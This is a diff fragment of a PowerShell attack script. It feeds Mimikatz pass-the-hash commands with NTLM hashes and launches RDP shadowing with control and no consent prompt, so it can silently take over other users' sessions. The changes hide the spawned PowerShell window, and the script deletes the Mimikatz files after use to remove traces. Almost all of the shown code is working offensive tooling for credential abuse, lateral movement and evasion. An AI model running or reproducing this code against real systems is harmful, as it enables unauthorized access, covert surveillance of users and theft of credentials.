@@ -154,7 +154,7 @@ function EnableTLS {
    $Host.UI.RawUI.ForegroundColor = 'Gray'
    if(Test-Path variable:PassTheHash) { powershell "Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value'"
    $RDP = "New-PSSession -Computer $computer"
-   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $RDP' exit"
+   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` -WindowStyle` Hidden` $RDP' exit"
    powershell $mimipath\mimikatz.exe $cmd ; Write-Host "" ; del file.txt }
    
    else { Write-Host ""
@@ -254,12 +254,12 @@ function EnableTLS {
     if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
     
     if($control -eq 'true') { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /control` /noconsentprompt` /f"
-    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
+    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
     
     else { $mimipwn = "mstsc` /v` $computer` $admin` /shadow:$shadow` /noconsentprompt` /f"
-    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
+    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:$mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
